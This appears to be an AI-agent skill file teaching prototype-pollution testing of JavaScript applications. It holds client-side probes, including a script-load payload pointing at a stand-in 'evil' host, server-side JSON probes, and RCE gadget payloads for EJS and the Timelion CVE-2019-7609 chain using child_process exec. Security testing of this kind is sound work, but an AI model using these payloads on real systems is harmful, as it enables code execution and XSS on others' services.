---
name: prototype-pollution
description: >-
  Prototype pollution testing for JavaScript stacks. Use when user input is
  merged into objects (query parsers, JSON bodies, deep assign), when
  configuring libraries via untrusted keys, or when hunting RCE gadgets via
  polluted Object.prototype in Node or the browser.
---

# SKILL: Prototype Pollution — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert prototype pollution for client and server JS. Covers `__proto__` vs `constructor.prototype`, merge-sink detection, Express/qs-style black-box probes, and gadget chains (EJS, Timelion-class patterns, child_process/NODE_OPTIONS). Assumes you know object spread and prototype inheritance — focus is on **parser behavior** and **post-pollution sinks**.

Routing note: prioritize PP when you see deep merges, recursive assign, `JSON.parse` followed by `Object.assign`, or URL queries converted to nested objects.

## 0. QUICK START

### Client-side first probes

```text
#__proto__[polluted]=1
#__proto__[polluted]=polluted
#constructor[prototype][polluted]=1
```

When input can reflect into DOM or framework routing, pair with `alert(1)` / `console` checks to observe whether global object properties were polluted.

```text
#__proto__[xxx]=alert(1)
```

### Server-side first probes（JSON / form）

```json
{"__proto__":{"polluted":true}}
```

```json
{"constructor":{"prototype":{"polluted":true}}}
```

After sending, check whether unrelated follow-up responses show abnormal headers/status/JSON spacing, or whether app logic reads `Object.prototype.polluted` (see §3 detection table).

### Quick boolean

If target code uses `lodash.merge`, `deep-extend`, `hoek.applyToDefaults`, or some `qs`/`query-string` configurations, **raise priority**.

---

## 1. MECHANISM

**Prototype chain**: when accessing `obj.key`, if `obj` lacks own property `key`, lookup walks up `[[Prototype]]` until `Object.prototype`.

**`__proto__`**: many parsers treat literal key `__proto__` as a magic path that attaches child properties to the prototype. Merging `{ "__proto__": { "x": 1 } }` can be equivalent to `Object.prototype.x = 1` depending on implementation and patch level.

**`constructor.prototype`**: `constructor` typically points to the object's constructor function; `constructor.prototype` is that constructor's prototype object. For plain objects this usually links to `Object.prototype`. Example path:

```json
{"constructor":{"prototype":{"polluted":1}}}
```

This is not always equivalent to `__proto__` (filtering, JSON parsing, Bun/Node differences), so **test both paths**.

**Core issue**: this is not just "one extra parameter"; in non-isolated merge logic, attacker-controlled keys point to **prototype objects**, giving **global** or shared template context malicious properties that later code reads normally, triggering gadgets.

---

## 2. CLIENT-SIDE DETECTION

### URL fragment

```text
https://app.example/page#__proto__[admin]=1
```

```text
https://app.example/#__proto__[xxx]=alert(1)
```

If router or analytics code parses fragments into objects and then merges, pollution may occur.

### `constructor.prototype` path

```text
#constructor[prototype][role]=admin
```

### DOM / attribute injection ideas

If the framework merges attribute names as object keys:

```text
__proto__[src]=//evil/xss.js
```

Event-handler style keys (implementation-dependent):

```text
__proto__[onerror]=alert(1)
```

**Verification**: open a fresh page without fragment and check in console whether test keys remain on `Object.prototype`; account for extension and DevTools interference.

---

## 3. SERVER-SIDE DETECTION (Express / Node, black-box)

The payloads below assume body/query is deeply parsed into objects by **qs** or similar parsers (possibly with `body-parser`). Observe **global side effects**, not only current endpoint return values.

| Payload (JSON example) | Expected observable signal |
|----------------------|----------------|
| `{"__proto__":{"parameterLimit":1}}` | Multi-parameter parsing in follow-up requests is ignored or abnormal (`qs`-style `parameterLimit`) |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | Double-question-mark prefixes like `??foo=bar` are accepted or behavior changes sharply |
| `{"__proto__":{"allowDots":true}}` | Nested keys like `?foo.bar=baz` are expanded via dot notation |
| `{"__proto__":{"json spaces":" "}}` | JSON-serialized responses gain extra spaces (`JSON.stringify` spacing setting polluted) |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS responses include `foo`-related headers (if framework reads config from prototype) |
| `{"__proto__":{"status":510}}` | Some response status changes to 510 or another abnormal code (app reads `status` from object) |

**Operational tip**: send pollution request first, then a **clean** request to observe persistence; connection pools and worker lifecycle affect whether impact is globally visible.

---

## 4. EXPLOITATION GADGETS

| Target / scenario | Payload or pattern | Notes |
|-------------|------------|------|
| **EJS** | `{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('COMMAND')"}}` | If template engine options like `escapeFunction` are read from polluted prototype, this may lead to RCE; strongly version/config dependent |
| **Timelion expression chain (CVE-2019-7609)** | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')` | Historical chain: prototype pollution + timeline expression execution; useful to understand **expression + PP** combinations |
| **Node `child_process`** | Pollute `shell`, `argv0`, `env`, `NODE_OPTIONS`, etc. (merged into `exec`/`fork` option objects) | Depends on whether later code calls `spawn`/`fork` and reads options from prototype chain |
| **Generic constructor path** | `{"constructor":{"prototype":{"foo":"bar"}}}` | Bypasses weak validation that filters only the `__proto__` key |

**Chain mindset**: pollution -> dependency reads `obj.settings.xxx` without `hasOwnProperty` -> RCE / SSRF / path traversal.

---

## 5. TOOLS

| Project | Purpose |
|------|------|
| **yeswehack/pp-finder** | Helps locate PP-prone merge points and patterns |
| **yuske/silent-spring** | Research and detection around prototype-pollution surfaces |
| **yuske/server-side-prototype-pollution** | Server-side PP testing suite/methodology |
| **BlackFan/client-side-prototype-pollution** | Browser-side PP cases and payloads |
| **portswigger/server-side-prototype-pollution** | Burp ecosystem extension / supporting material |
| **msrkp/PPScan** | Scanning/verification helper |

Prioritize use on **authorized** targets; automated tools can cause side effects on stateful applications.

---

## 6. DECISION TREE

```
                    Input merged into nested object?
                    (query, JSON, GraphQL vars, YAML→JSON)
                                |
               NO --------------+-------------- YES
               |                              |
        Other vuln class                Parser allows __proto__ /
                                        constructor.prototype keys?
                                                    |
                                    NO --------------+-------------- YES
                                    |                              |
                             Check unicode /                    Confirm global effect:
                             bypass of key names               clean follow-up request
                                    |                              |
                                    +--------------+----------------+
                                                   |
                                                   v
                                    Gadget present? (template, spawn, JSON.stringify opts, CORS)
                                                   |
                              NO ------------------+------------------ YES
                              |                                         |
                       Report PP as DoS /              Build minimal RCE or
                       logic impact                   high-impact PoC
                              |                                         |
                              +---------------------+-------------------+
                                                    |
                                                    v
                              Client-side: fragment / DOM / third-party script
                              Server-side: qs/body-parser/lodash/deep-merge version audit
```

---

## Related routing

- Input routing and multi-injection parallel entry -> [Injection Testing Router](../injection-checking/SKILL.md).
- Template execution chains (non-PP) -> [SSTI](../ssti-server-side-template-injection/SKILL.md).
- Insecure deserialization (non-JS prototype) -> [Deserialization](../deserialization-insecure/SKILL.md).
